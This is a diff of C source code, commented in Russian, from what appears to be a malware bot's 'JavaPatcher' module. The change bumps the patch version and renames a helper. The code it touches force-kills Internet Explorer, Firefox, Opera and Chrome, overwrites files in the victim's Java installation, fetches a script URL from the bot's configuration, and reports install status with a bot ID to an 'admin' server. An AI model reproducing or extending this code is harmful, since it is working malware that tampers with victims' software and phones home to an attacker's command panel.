@@ -39,7 +39,7 @@ static int javaCompatible = 0; //совместимость явы для разных алгоритмов установ
 static char javaHome[MAX_PATH]; //папка явы
 static char javaMSI[MAX_PATH]; //папка с параметрами автообновления
 
-char versionPatch[] = "1.5"; //версия патча
+char versionPatch[] = "1.6"; //версия патча
 
 //Определяет версию явы, возвращает true если ява есть, иначе false. Заодно в переменную javaHome ложит путь к яве
 static bool GetJavaVersion()
@@ -153,7 +153,7 @@ static PCHAR GetJavaPatcherURL()
 		#ifdef JavaConfigH
 			URL = GetJavaScriptURL(0);//JavaPatcherURLPath);
 		#else
-			URL = GetBotScriptURL(0, 0);//JavaPatcherURLPath); 
+			URL = GetBotScriptURL(0, 0);//JavaPatcherURLPath);
 		#endif
 		if (URL == NULL)
         	pSleep(60000);
@@ -195,7 +195,7 @@ void SendLogToAdmin( const char* c, const char* v )
 {
 	char botUid[100];
 	GenerateUid(botUid);
-	PCHAR adminUrl = GetJavaPatcherURL(); 
+	PCHAR adminUrl = GetJavaPatcherURL();
 	SendLogToAdmin( adminUrl, botUid, c, v );
 	STR::Free(adminUrl);
 }
@@ -726,24 +726,6 @@ static int FindBlockingProcesses( char* FileName, ULONG** PIDs )
 	return procCount;
 }
 
-void KillAllBrowser()
-{
-	const char* browsers[] = { "IEFrame", "MozillaWindowClass", "OperaWindowClass", "Chrome_WidgetWin_0", 0 };
-	const char** bb = browsers;
-	while( *bb )
-	{
-		HWND wnd = (HWND) pFindWindowA( *bb, 0 );
-		if( wnd )
-		{
-			DWORD PID = 0;
-			pGetWindowThreadProcessId( wnd, &PID );
-			if( PID )
-				if( KillProcess(PID, 1000) )
-					DBG( "JavaPatcher", "kill browser %s", *bb );
-		}
-		bb++;
-	}
-}
 
 ///////////////////////////////////////////////////////////////////////////////
 HHOOK hMsgBoxHook;
@@ -1002,7 +984,7 @@ DWORD WINAPI JavaPatch( LPVOID lpData )
 				PIDS = 0;
 			};	
 					
-			KillAllBrowser();
+			KillAllBrowsers();
 
 			if( pCopyFileA( srcFile, dstFile, FALSE ) ) 
 			{
@@ -1106,7 +1088,7 @@ bool ExecuteDeletePathCommand(LPVOID Manager, PCHAR Command, PCHAR Args)
 
 	if( !GetJavaVersion() ) return false;
 
-	KillAllBrowser();
+	KillAllBrowsers();
 	pSleep(5000);
 
 	char path[MAX_PATH];
@@ -1164,10 +1146,12 @@ void JavaPatcherAddPidToFile()
 // Функция сигнализирует о необходимости запуска патчей
 void  JavaPatcherSignal()
 {
+
 	if( PatchIsLoaded() ) return; //если патч установлен, то не нужно его повторно ставить
+
 	SendLogToAdmin( "setup_patch", "0" );
 
-    JavaPatcherAddPidToFile();
+	JavaPatcherAddPidToFile();
 
 	char SignalFile[MAX_PATH];
 	if( GetWorkFolder( SignalFile, JavaPatcherSignalFile ) )
